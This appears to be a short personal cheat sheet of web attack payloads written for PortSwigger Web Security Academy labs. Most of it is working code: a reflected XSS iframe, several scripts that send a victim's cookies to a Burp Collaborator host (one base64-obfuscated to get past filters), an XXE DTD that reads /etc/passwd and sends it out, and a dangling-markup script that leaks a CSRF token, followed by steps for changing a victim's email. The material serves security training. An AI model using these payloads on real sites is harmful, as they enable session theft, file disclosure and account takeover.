Simple Reflected XSS in iFrame:

`<iframe src="https://<VICTIM_SITE>.web-security-academy.net/?find=%22-alert(1)}//">`

---

Steal cookie:
- can be used in xss, web cache poisoning 

```JavaScript
<script>
fetch('https://<YOUR_BURP_COLLAB>.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Oneliner:
`<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{method: 'POST',mode: 'no-cors',body:document.cookie});</script>`

Or

```js
var i = new Image();i.src="//<YOUR_COLLAB_ID>.burpcollaborator.net?q="+document.cookie;document.body.appendChild(i);
```

Above in iframe:
```html
<iframe src="https://<LAB_ID>.web-security-academy.net/?find=%22-var i = new Image();i.src="//<YOUR_COLLAB_ID>.burpcollaborator.net?q="+document.cookie;document.body.appendChild(i);">
```

B64 encode the js and include in iframe for character restriction bypass:

```html
<iframe src="https://<LAB_ID>.web-security-academy.net/?find=test%22-eval(atob('dmFyIGkgPSBuZXcgSW1hZ2UoKTtpLnNyYz0iLy9iZ3ZueTd4N3JiZ3p0c3RmaGV1czlrZDB4cjNtcmIuYnVycGNvbGxhYm9yYXRvci5uZXQ/cT0iK2RvY3VtZW50LmNvb2tpZTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGkpOw=='))//">
```

---

XXE dtd file:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<YOUR_BURP_COLLAB>.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```

Access in app by finding an xxe vuln and using:
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://<YOUR_EXPLOIT_SERVER>.web-security-academy.net/test.dtd"> %xxe;]>
```

---

Script used in "*Reflected XSS protected by CSP, with dangling markup attack*" to get the victim's CSRF token

```js
<script>
location='https://<VICTIM_SITE>.web-security-academy.net/email?email=%22%3E%3Ctable%20background=%27//<YOUR_BURP_COLLAB>.burpcollaborator.net?';
</script> 
```

Take that csrf token and put it into a csrf generated request for changing email. Put that code into the exploit server and send to victim. 

---